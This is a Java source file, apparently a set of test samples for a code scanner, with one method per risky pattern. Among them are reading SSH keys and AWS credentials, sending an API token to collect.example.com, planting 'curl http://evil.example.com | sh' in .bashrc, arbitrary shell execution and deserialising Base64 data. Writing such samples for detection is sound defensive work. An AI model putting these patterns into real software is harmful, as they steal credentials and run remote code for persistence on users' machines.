package com.example;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.OutputStream;
import java.net.DatagramSocket;
import java.net.Socket;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Base64;
import javax.script.ScriptEngine;

public class Suspicious {
    public void cmdExec(String c) throws Exception {
        Runtime.getRuntime().exec(c);
        new ProcessBuilder("sh", "-c", c).start();
    }

    public void netGeneral(String u) throws Exception {
        new URL(u).openConnection();
        new URL(u).openStream();
    }

    public void netSocket(String host) throws Exception {
        new Socket(host, 4444);
        new DatagramSocket(4444);
    }

    public void dynEval(String name) throws Exception {
        Class.forName(name);
        ClassLoader.getSystemClassLoader().loadClass(name);
        Object m = null;
        m.getClass().getMethod("run").invoke(m);
    }

    public void filProbe() throws Exception {
        new FileInputStream(Paths.get(System.getProperty("user.home"), ".ssh", "id_rsa").toFile());
        Files.readString(Paths.get("/root/.aws/credentials"));
    }

    public String envSecret() {
        return System.getenv("AWS_SECRET_ACCESS_KEY");
    }

    public byte[] obfExec(String p) throws Exception {
        byte[] raw = Base64.getDecoder().decode(p);
        ObjectInputStream ois = new ObjectInputStream(new java.io.ByteArrayInputStream(raw));
        ois.readObject();
        return raw;
    }

    public void exfiltrate() throws Exception {
        String token = System.getenv("API_TOKEN");
        String url = "https://collect.example.com/" + token;
        new URL(url).openStream();
    }

    public void persist() throws Exception {
        Path target = Paths.get(System.getProperty("user.home"), ".bashrc");
        Files.writeString(target, "curl http://evil.example.com | sh\n");
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {}));
    }

    public void embDataDump(byte[] dataset, Path out) throws Exception {
        Files.write(out, dataset);
    }

    public void embCopyExport(Path src, Path dst) throws Exception {
        Files.copy(src, Paths.get("output", "result.bin"));
    }

    public void embLogDump(byte[] dataset) {
        System.out.println(dataset);
    }

    public void embStegoWeight(byte[] weights) throws Exception {
        String encoded = Base64.getEncoder().encodeToString(weights);
        saveWeights(encoded);
    }

    private void saveWeights(String s) throws Exception {
        try (OutputStream os = new FileOutputStream("weights.bin")) {
            os.write(s.getBytes());
        }
    }
}
